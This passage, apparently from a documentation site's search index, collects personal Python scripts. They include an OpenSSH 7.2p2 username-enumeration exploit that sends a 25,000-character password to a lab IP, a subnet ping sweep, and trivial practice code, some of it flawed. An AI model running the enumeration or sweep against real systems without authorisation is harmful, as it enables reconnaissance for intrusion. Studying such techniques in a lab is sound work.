input(\"Enter SSH username: \") # Set a long password for testing (25000 'A' characters) p = 'A' * 25000 # Initialize SSH client ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) try: # Connect to SSH server (replace IP address and port) ssh.connect('10.10.190.142', port=2222, username=user, password=p) print(\"SSH connection successful!\") except Exception as e: print(\"SSH connection failed:\", str(e)) finally: # Close SSH connection ssh.close()","title":"exploit_OpenSSHd_7.2p2_username_enumeration.py"},{"location":"python/#misc-code-filepy","text":"import matplotlib.pyplot as plt # Define the disciplines and their contributions disciplines = ['Cybersecurity', 'Law', 'Ethics'] contributions = [30, 35, 25] # Example percentages for contribution to the integrated perspective # Create a pie chart to represent the integration of disciplines plt.figure(figsize=(7,7)) plt.pie(contributions, labels=disciplines, autopct='%1.1f%%', startangle=140, colors=['#ff9999','#66b3ff','#99ff99']) plt.title('Integration of Disciplines in Privacy Research (Cybersecurity, Law, Ethics)') plt.axis('equal') # Equal aspect ratio ensures the pie chart is circular. plt.show()","title":"MISC CODE FILE.py"},{"location":"python/#pingsweeppy","text":"#!/usr/bin/env python3 import subprocess import ipaddress import netifaces import sys from multiprocessing import Pool # Function to extract network prefix from IP address def get_network_prefix(ip): ip = ipaddress.ip_interface(ip) return ip.network.network_address # Function to perform ping sweep for a given IP address def ping_sweep(ip): result = subprocess.run(['ping', '-c', '1', '-W', '1', str(ip)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) if result.returncode == 0: print(ip) # Get the IP address of the host ip_address = None for interface in netifaces.interfaces(): addresses = netifaces.ifaddresses(interface).get(netifaces.AF_INET) if addresses is not None: for address in addresses: if 'addr' in address and not ipaddress.ip_address(address['addr']).is_loopback: ip_address = address['addr'] break if ip_address: break if not ip_address: print(\"Failed to retrieve IP address. Please check your network connection.\") sys.exit(1) # Extract the network prefix network_prefix = get_network_prefix(ip_address) # Print the network prefix print(\"Network prefix:\", network_prefix) # Create a pool of worker processes pool = Pool() # Loop over the IP addresses in the range 1 to 254 within the same network prefix ip_addresses = [str(network_prefix) + \".\" + str(ip_suffix) for ip_suffix in range(1, 255)] # Perform ping sweep asynchronously for ip in ip_addresses: pool.apply_async(ping_sweep, (ip,)) # Close the pool to prevent further tasks from being submitted pool.close() # Wait for the worker processes to complete pool.join()","title":"pingsweep.py"},{"location":"python/#pythonpracticepy","text":"print (\"helloworld\")","title":"PythonPractice.py"},{"location":"python/#shippingcostpy","text":"customer_basket_cost = 101 customer_basket_weight = 44 shipping=0 + customer_basket_cost weight_cost=1.20 shippingunder100= weight_cost*customer_basket_weight+customer_basket_cost # Write if statement here to calculate the total cost if customer_basket_cost>=100: print(shipping) else: customer_basket_weight<100 print(shippingunder100)","title":"ShippingCost.py"}]}